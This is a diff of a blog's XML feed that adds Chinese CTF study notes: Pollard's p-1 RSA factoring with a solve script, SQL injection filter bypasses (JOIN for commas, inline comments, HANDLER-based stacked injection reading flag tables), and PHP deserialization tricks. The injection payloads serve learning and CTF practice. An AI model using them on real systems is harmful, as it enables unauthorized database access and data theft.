@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>Pollard&#39;s p-1算法</title>
+      <link href="/blog/2026/03/01/Pollard&#39;s%20p-1%E7%AE%97%E6%B3%95/"/>
+      <url>/blog/2026/03/01/Pollard&#39;s%20p-1%E7%AE%97%E6%B3%95/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Pollard’s-p-1算法"><a href="#Pollard’s-p-1算法" class="headerlink" title="Pollard’s p-1算法"></a>Pollard’s p-1算法</h1><p>标签（空格分隔）： RSA</p><hr><p>如果 p是一个素数，且 a 不是 p 的倍数，那么：</p><center>$a^{p-1}≡1 \ mod \ p$</center><center>$a^{(p-1)*k}≡1^k ≡1 \ mod \ p$</center><p>换句话说，只要指数是 p−1的倍数，底数的幂除以p 的余数就是 1。</p><p>我们想要分解的数是 N。假设 N 有一个我们不知道的素因子 p。</p><p>试图构造一个数 M，使得 M 恰好是 p−1 的倍数。</p><p>根据费马小定理：如果 M 是 p−1 的倍数，那么 aᴹ ≡ 1 (mod p)。</p><p>这意味着 p 能整除 aᴹ − 1。</p><p>由于 p 也整除 N，那么 p 必然能整除 gcd(aᴹ − 1, N)。</p><p>所以，如果计算 gcd(aᴹ − 1, N)，这个最大公因数很可能就是 p 本身（或者是 N 的一个非平凡因子）。</p><hr><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from random import choice</span><br><span class="line">from Crypto.Util.number import isPrime, sieve_base as primes</span><br><span class="line">from flag import flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getPrime(bits):</span><br><span class="line">    while True:</span><br><span class="line">        n = 2</span><br><span class="line">        while n.bit_length() &lt; bits:</span><br><span class="line">            n *= choice(primes)</span><br><span class="line">        if isPrime(n + 1):</span><br><span class="line">            return n + 1</span><br><span class="line"></span><br><span class="line">e = 0x10001</span><br><span class="line">m = int.from_bytes(flag.encode(), &#x27;big&#x27;)</span><br><span class="line">p, q = [getPrime(2048) for _ in range(2)]</span><br><span class="line">n = p * q</span><br><span class="line">c = pow(m, e, n)</span><br><span class="line"></span><br><span class="line"># n = 32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513</span><br><span class="line"># c = 26308018356739853895382240109968894175166731283702927002165268998773708335216338997058314157717147131083296551313334042509806229853341488461087009955203854253313827608275460592785607739091992591431080342664081962030557042784864074533380701014585315663218783130162376176094773010478159362434331787279303302718098735574605469803801873109982473258207444342330633191849040553550708886593340770753064322410889048135425025715982196600650740987076486540674090923181664281515197679745907830107684777248532278645343716263686014941081417914622724906314960249945105011301731247324601620886782967217339340393853616450077105125391982689986178342417223392217085276465471102737594719932347242482670320801063191869471318313514407997326350065187904154229557706351355052446027159972546737213451422978211055778164578782156428466626894026103053360431281644645515155471301826844754338802352846095293421718249819728205538534652212984831283642472071669494851823123552827380737798609829706225744376667082534026874483482483127491533474306552210039386256062116345785870668331513725792053302188276682550672663353937781055621860101624242216671635824311412793495965628876036344731733142759495348248970313655381407241457118743532311394697763283681852908564387282605279108</span><br></pre></td></tr></table></figure><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from gmpy2 import *</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">def pollard(N):</span><br><span class="line">    a = 2</span><br><span class="line">    n = 2</span><br><span class="line">    while True:</span><br><span class="line">        a = powmod(a, n, N)</span><br><span class="line">        p = gcd(a-1, N)</span><br><span class="line">        if p != 1 and p != N:</span><br><span class="line">            return p</span><br><span class="line">        n += 1</span><br><span class="line"></span><br><span class="line">n = 32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513</span><br><span class="line">c = 26308018356739853895382240109968894175166731283702927002165268998773708335216338997058314157717147131083296551313334042509806229853341488461087009955203854253313827608275460592785607739091992591431080342664081962030557042784864074533380701014585315663218783130162376176094773010478159362434331787279303302718098735574605469803801873109982473258207444342330633191849040553550708886593340770753064322410889048135425025715982196600650740987076486540674090923181664281515197679745907830107684777248532278645343716263686014941081417914622724906314960249945105011301731247324601620886782967217339340393853616450077105125391982689986178342417223392217085276465471102737594719932347242482670320801063191869471318313514407997326350065187904154229557706351355052446027159972546737213451422978211055778164578782156428466626894026103053360431281644645515155471301826844754338802352846095293421718249819728205538534652212984831283642472071669494851823123552827380737798609829706225744376667082534026874483482483127491533474306552210039386256062116345785870668331513725792053302188276682550672663353937781055621860101624242216671635824311412793495965628876036344731733142759495348248970313655381407241457118743532311394697763283681852908564387282605279108</span><br><span class="line">e = 0x10001</span><br><span class="line"></span><br><span class="line">p = pollard(n)</span><br><span class="line">q = n // p</span><br><span class="line">d = invert(e, (p-1)*(q-1))</span><br><span class="line">print(long_to_bytes(powmod(c, d, n)))</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Crypto </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> RSA </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>ECC(椭圆曲线加密)）</title>
       <link href="/blog/2026/02/25/ECC(%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E5%8A%A0%E5%AF%86)/"/>
       <url>/blog/2026/02/25/ECC(%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E5%8A%A0%E5%AF%86)/</url>
@@ -179,31 +204,6 @@
     
     
     <entry>
-      <title>SQL&quot;,&quot;号绕过</title>
-      <link href="/blog/2026/01/28/SQL_,_%E5%8F%B7%E7%BB%95%E8%BF%87/"/>
-      <url>/blog/2026/01/28/SQL_,_%E5%8F%B7%E7%BB%95%E8%BF%87/</url>
-      
-        <content type="html"><![CDATA[<h1 id="SQL”-”号绕过"><a href="#SQL”-”号绕过" class="headerlink" title="SQL”,”号绕过"></a>SQL”,”号绕过</h1><p>标签（空格分隔）： SQL绕过</p><hr><p>join注入：当，被过滤的时候可以使用该方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SELECT *</span><br><span class="line">FROM users</span><br><span class="line">UNION</span><br><span class="line">SELECT *</span><br><span class="line">FROM (</span><br><span class="line">(SELECT 1) A</span><br><span class="line">JOIN (SELECT 2) B</span><br><span class="line">JOIN (SELECT 3) C</span><br><span class="line">JOIN (SELECT 4) D</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>此时空格被过滤的化可以使用%0a（URL编译）和%09（水平换行）<br>见<a href="https://blog.csdn.net/qq_61778128/article/details/123205490">https://blog.csdn.net/qq_61778128/article/details/123205490</a></p><p>sqlite注入查表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">union</span><br><span class="line">select*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTnameFROMsqlite_master)d</span><br><span class="line">join(selectSELECTsqlFROMsqlite_master)f</span><br></pre></td></tr></table></figure><p>找到后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">unionselect*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTconfig_keyFROMsys_config)d</span><br><span class="line">join(SELECTconfig_valueFROMsys_config)f`</span><br></pre></td></tr></table></figure>]]></content>
-      
-      
-      <categories>
-          
-          <category> Web </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> SQL绕过 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>SQL union联合注入</title>
       <link href="/blog/2026/01/28/SQL%20union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"/>
       <url>/blog/2026/01/28/SQL%20union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</url>
@@ -229,11 +229,36 @@
     
     
     <entry>
-      <title>SQL&#39;select&#39;绕过</title>
-      <link href="/blog/2026/01/28/SQL&#39;select&#39;%E7%BB%95%E8%BF%87/"/>
-      <url>/blog/2026/01/28/SQL&#39;select&#39;%E7%BB%95%E8%BF%87/</url>
+      <title>SQL&quot;,&quot;号绕过</title>
+      <link href="/blog/2026/01/28/SQL_,_%E5%8F%B7%E7%BB%95%E8%BF%87/"/>
+      <url>/blog/2026/01/28/SQL_,_%E5%8F%B7%E7%BB%95%E8%BF%87/</url>
       
-        <content type="html"><![CDATA[<h1 id="SQL’select’绕过"><a href="#SQL’select’绕过" class="headerlink" title="SQL’select’绕过"></a>SQL’select’绕过</h1><p>标签（空格分隔）： SQL绕过</p><hr><h2 id="直接查询handler函数使用语法"><a href="#直接查询handler函数使用语法" class="headerlink" title="##直接查询handler函数使用语法"></a>##直接查询<br>handler函数使用<br><code>语法</code><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">先是创造句柄</span><br><span class="line">handler `()` open as p;</span><br><span class="line"></span><br><span class="line">然后是查看数据</span><br><span class="line"># 获取第一行数据</span><br><span class="line">handler p read handler_index first;</span><br><span class="line"># 获取下一行数据</span><br><span class="line">handler p read handler_index next;</span><br><span class="line"># 获取上一行数据</span><br><span class="line">handler p read handler_index prev;</span><br><span class="line"># 获取最后一行数据</span><br><span class="line">handler p read handler_index last;</span><br><span class="line"></span><br></pre></td></tr></table></figure></h2><p>##改表和行名<br>alter函数使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">先将原来表名改为别的: alter table `默认的` rename to `sss`</span><br><span class="line">重命名表：alter table &#x27;表名&#x27; rename to &#x27;默认查寻的表名&#x27;。</span><br><span class="line">重命名字段：alter table &#x27;默认查询的表名&#x27; change &#x27;要转移的字段&#x27; &#x27;默认查询的字段&#x27; column_type（就是varchar(100)）;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+        <content type="html"><![CDATA[<h1 id="SQL”-”号绕过"><a href="#SQL”-”号绕过" class="headerlink" title="SQL”,”号绕过"></a>SQL”,”号绕过</h1><p>标签（空格分隔）： SQL绕过</p><hr><p>join注入：当，被过滤的时候可以使用该方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SELECT *</span><br><span class="line">FROM users</span><br><span class="line">UNION</span><br><span class="line">SELECT *</span><br><span class="line">FROM (</span><br><span class="line">(SELECT 1) A</span><br><span class="line">JOIN (SELECT 2) B</span><br><span class="line">JOIN (SELECT 3) C</span><br><span class="line">JOIN (SELECT 4) D</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>此时空格被过滤的化可以使用%0a（URL编译）和%09（水平换行）<br>见<a href="https://blog.csdn.net/qq_61778128/article/details/123205490">https://blog.csdn.net/qq_61778128/article/details/123205490</a></p><p>sqlite注入查表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">union</span><br><span class="line">select*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTnameFROMsqlite_master)d</span><br><span class="line">join(selectSELECTsqlFROMsqlite_master)f</span><br></pre></td></tr></table></figure><p>找到后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">unionselect*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTconfig_keyFROMsys_config)d</span><br><span class="line">join(SELECTconfig_valueFROMsys_config)f`</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> SQL绕过 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQL空格绕过</title>
+      <link href="/blog/2026/01/28/SQL%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/"/>
+      <url>/blog/2026/01/28/SQL%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/</url>
+      
+        <content type="html"><![CDATA[<h1 id="SQL空格绕过"><a href="#SQL空格绕过" class="headerlink" title="SQL空格绕过"></a>SQL空格绕过</h1><p>标签（空格分隔）： SQL绕过</p><hr><p>##内联绕过<br>首先是空格被过滤了可以使用内联绕过具体使用例子如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原始语句：</span><br><span class="line">UNION SELECT 1,2,3</span><br><span class="line"></span><br><span class="line">绕过方式：</span><br><span class="line">UNI/*任意内容*/ON SEL/*注释*/ECT 1,2,3</span><br></pre></td></tr></table></figure><p>这样就可以绕过了</p><hr>]]></content>
       
       
       <categories>
@@ -279,36 +304,11 @@
     
     
     <entry>
-      <title>SQL堆叠注入</title>
-      <link href="/blog/2026/01/28/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
-      <url>/blog/2026/01/28/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
+      <title>SQL&#39;select&#39;绕过</title>
+      <link href="/blog/2026/01/28/SQL&#39;select&#39;%E7%BB%95%E8%BF%87/"/>
+      <url>/blog/2026/01/28/SQL&#39;select&#39;%E7%BB%95%E8%BF%87/</url>
       
-        <content type="html"><![CDATA[<h1 id="SQL堆叠注入"><a href="#SQL堆叠注入" class="headerlink" title="SQL堆叠注入"></a>SQL堆叠注入</h1><p>标签（空格分隔）： SQL</p><hr><p>运用情况：当有过滤select&#x2F;updata&#x2F;delete&#x2F;drop等等词的时候进行堆叠注入<br>所以只能使用hander来进行查询（hander不算正规的php，仅仅在MYsql中存在）<br>hander的</p><p>具体用法如下<br>– 创建索引<br><code>CREATE INDEX handler_index ON handler_table(id);</code></p><p>– 打开句柄<br><code>HANDLER handler_table OPEN AS p;</code></p><p>– 按索引读取第一行<br><code>HANDLER p READ handler_index FIRST;</code></p><p>– 按索引读取下一行<br><code>HANDLER p READ handler_index NEXT;</code></p><p>– 关闭句柄<br><code>HANDLER p CLOSE;</code></p><p>1.首先还是查询有几列<br><code>1&#39;order by 1;#</code></p><p>2.由于无法使用select，所以只能直接查询所有的数据库<br><code>1&#39;show databases;#</code></p><p>3.当查询到一个奇妙的数据库的时候使用<br><code>1&#39;;use (数据库名字);show tables;#</code></p><p>4.当找到了一个表有点奇怪（纯数字）的时候<br> <code>1&#39;;use supersqli;show columns from </code>表的名字<code>;#</code><br>&#x2F;&#x2F;注意当纯数字串是表名的时候要加反引号</p><p>5.此时可能找到了flag的位置，但是无法使用select所以使用hander<br><code>-1&#39;;use supersqli;handler (填入，纯数字记得加``) open as p;handler p read first;#</code></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> Web </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> SQL </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>SQL空格绕过</title>
-      <link href="/blog/2026/01/28/SQL%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/"/>
-      <url>/blog/2026/01/28/SQL%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/</url>
-      
-        <content type="html"><![CDATA[<h1 id="SQL空格绕过"><a href="#SQL空格绕过" class="headerlink" title="SQL空格绕过"></a>SQL空格绕过</h1><p>标签（空格分隔）： SQL绕过</p><hr><p>##内联绕过<br>首先是空格被过滤了可以使用内联绕过具体使用例子如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原始语句：</span><br><span class="line">UNION SELECT 1,2,3</span><br><span class="line"></span><br><span class="line">绕过方式：</span><br><span class="line">UNI/*任意内容*/ON SEL/*注释*/ECT 1,2,3</span><br></pre></td></tr></table></figure><p>这样就可以绕过了</p><hr>]]></content>
+        <content type="html"><![CDATA[<h1 id="SQL’select’绕过"><a href="#SQL’select’绕过" class="headerlink" title="SQL’select’绕过"></a>SQL’select’绕过</h1><p>标签（空格分隔）： SQL绕过</p><hr><h2 id="直接查询handler函数使用语法"><a href="#直接查询handler函数使用语法" class="headerlink" title="##直接查询handler函数使用语法"></a>##直接查询<br>handler函数使用<br><code>语法</code><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">先是创造句柄</span><br><span class="line">handler `()` open as p;</span><br><span class="line"></span><br><span class="line">然后是查看数据</span><br><span class="line"># 获取第一行数据</span><br><span class="line">handler p read handler_index first;</span><br><span class="line"># 获取下一行数据</span><br><span class="line">handler p read handler_index next;</span><br><span class="line"># 获取上一行数据</span><br><span class="line">handler p read handler_index prev;</span><br><span class="line"># 获取最后一行数据</span><br><span class="line">handler p read handler_index last;</span><br><span class="line"></span><br></pre></td></tr></table></figure></h2><p>##改表和行名<br>alter函数使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">先将原来表名改为别的: alter table `默认的` rename to `sss`</span><br><span class="line">重命名表：alter table &#x27;表名&#x27; rename to &#x27;默认查寻的表名&#x27;。</span><br><span class="line">重命名字段：alter table &#x27;默认查询的表名&#x27; change &#x27;要转移的字段&#x27; &#x27;默认查询的字段&#x27; column_type（就是varchar(100)）;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
       
       
       <categories>
@@ -379,6 +379,81 @@
     
     
     <entry>
+      <title>SQL堆叠注入</title>
+      <link href="/blog/2026/01/28/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
+      <url>/blog/2026/01/28/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
+      
+        <content type="html"><![CDATA[<h1 id="SQL堆叠注入"><a href="#SQL堆叠注入" class="headerlink" title="SQL堆叠注入"></a>SQL堆叠注入</h1><p>标签（空格分隔）： SQL</p><hr><p>运用情况：当有过滤select&#x2F;updata&#x2F;delete&#x2F;drop等等词的时候进行堆叠注入<br>所以只能使用hander来进行查询（hander不算正规的php，仅仅在MYsql中存在）<br>hander的</p><p>具体用法如下<br>– 创建索引<br><code>CREATE INDEX handler_index ON handler_table(id);</code></p><p>– 打开句柄<br><code>HANDLER handler_table OPEN AS p;</code></p><p>– 按索引读取第一行<br><code>HANDLER p READ handler_index FIRST;</code></p><p>– 按索引读取下一行<br><code>HANDLER p READ handler_index NEXT;</code></p><p>– 关闭句柄<br><code>HANDLER p CLOSE;</code></p><p>1.首先还是查询有几列<br><code>1&#39;order by 1;#</code></p><p>2.由于无法使用select，所以只能直接查询所有的数据库<br><code>1&#39;show databases;#</code></p><p>3.当查询到一个奇妙的数据库的时候使用<br><code>1&#39;;use (数据库名字);show tables;#</code></p><p>4.当找到了一个表有点奇怪（纯数字）的时候<br> <code>1&#39;;use supersqli;show columns from </code>表的名字<code>;#</code><br>&#x2F;&#x2F;注意当纯数字串是表名的时候要加反引号</p><p>5.此时可能找到了flag的位置，但是无法使用select所以使用hander<br><code>-1&#39;;use supersqli;handler (填入，纯数字记得加``) open as p;handler p read first;#</code></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> SQL </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>PHP魔术技巧</title>
+      <link href="/blog/2026/01/28/php%E9%AD%94%E6%9C%AF%E6%8A%80%E5%B7%A7/"/>
+      <url>/blog/2026/01/28/php%E9%AD%94%E6%9C%AF%E6%8A%80%E5%B7%A7/</url>
+      
+        <content type="html"><![CDATA[<h1 id="php魔术技巧"><a href="#php魔术技巧" class="headerlink" title="php魔术技巧"></a>php魔术技巧</h1><p>标签（空格分隔）： PHP #魔术技巧#</p><p>—php</p><p>反序列化的基本格式：O:组的字节:”定义的组的名字”:有几个参数:{s:4:”flag”;s:3:”111”;}</p><p>构造脚本可以在后面这么加$A &#x3D; new Demo (‘fl4g.php’);&#x2F;&#x2F;创建对象<br>                                      $C &#x3D; serialize($A); </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_wakeup()：如果察觉到有反序列化的参数值那么将会拒绝执行</span><br><span class="line">//绕过方法：将序列化的对象的属性（参数个数）个数改了</span><br><span class="line"></span><br><span class="line">__destruct():当对象的所有引用被删除或脚本执行结束时，PHP 会自动调用析构函数。</span><br><span class="line"></span><br><span class="line">preg_match(’/[oc]:\d+:/i’, $var)：当中括号的东西出现就会被过滤&#123;应对办法：单双引号绕过</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__construct()：这是一个构造函数，在实例化一个对象的时候，首先会去自动执行的一个方法。</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> PHP </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>php函数简记</title>
+      <link href="/blog/2026/01/28/php%E5%87%BD%E6%95%B0%E7%AE%80%E8%AE%B0/"/>
+      <url>/blog/2026/01/28/php%E5%87%BD%E6%95%B0%E7%AE%80%E8%AE%B0/</url>
+      
+        <content type="html"><![CDATA[<p>一些简单php函数简记</p><p>标签（空格分隔）： PHP </p><p>–PHP 函数</p><h2 id="php函数简记"><a href="#php函数简记" class="headerlink" title="php函数简记"></a>php函数简记</h2><p>在此输入正文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">mb_substr()：函数返回字符串的一部分。substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用mb_substr()。</span><br><span class="line">//注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。</span><br><span class="line"></span><br><span class="line">mb_strpos()：查找字符串在另一个字符串中首次出现的位置</span><br><span class="line"></span><br><span class="line">in_array()函数：搜索数组中是否存在指定的值。</span><br><span class="line">//注释：如果 search 参数是字符串且 type 参数被设置为 TRUE，则搜索区分大小写。</span><br><span class="line"></span><br><span class="line">strstr()函数：用于在一个字符串查找另一个字符串的第一次出现</span><br><span class="line">//注释：区分大小写</span><br><span class="line"></span><br><span class="line">urldecode()：解码已编码的 URL 字符串</span><br><span class="line"></span><br><span class="line">ord()：返回字符串第一个字符的ASCll值</span><br><span class="line"></span><br><span class="line">strrev()：用于反转字符串</span><br><span class="line">//如：strrev(&quot;hello&quot;)  echo: olleh</span><br><span class="line"></span><br><span class="line">strlen()：用于获取字符串的长度。返回字节数</span><br><span class="line"></span><br><span class="line">str_rot：用于对字符串进行ROT13编码</span><br><span class="line"></span><br><span class="line">chr()：用于从指定的ASCll值返回字符</span><br><span class="line">//注释：可以是10/8/16进制</span><br><span class="line"></span><br><span class="line">file_get_contents()： 是PHP中用于读取文件内容的函数</span><br><span class="line">//注释：将文件中数据提取为字符串的函数，要用data://协议构造数据流，使它当作php文件。</span><br><span class="line">//所以需要这样设计代码：?file2=data://text/plain,hello ctf</span><br><span class="line"></span><br><span class="line">str_split() 函数用于将字符串按指定的分隔符分割成多个子字符串，并返回一个包含这些子字符串的列表</span><br><span class="line"></span><br><span class="line">ctype_alpha 函数用于检测字符串中的所有字符是否都是字母。它返回布尔值：如果字符串中的每个字符都是字母，则返回 true，否则返回 false</span><br><span class="line"></span><br><span class="line">ctype_upper：检测提供的 string 类型的 text 里面的所有字符是否都是大写字符</span><br><span class="line"></span><br><span class="line">strlen() :检测字符串长度</span><br><span class="line">__destruct()：这是一个析构函数，在对象的所有引用被删除或者当对象被显示销毁执行的魔术方法。注意：在实例化对象后，代码运行完全销毁，会触发析构函数__destruct()；反序列化得到的是对象，用完之后会销毁，触发析构函数。这道题中发序列化之后就会触发析构函数。</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
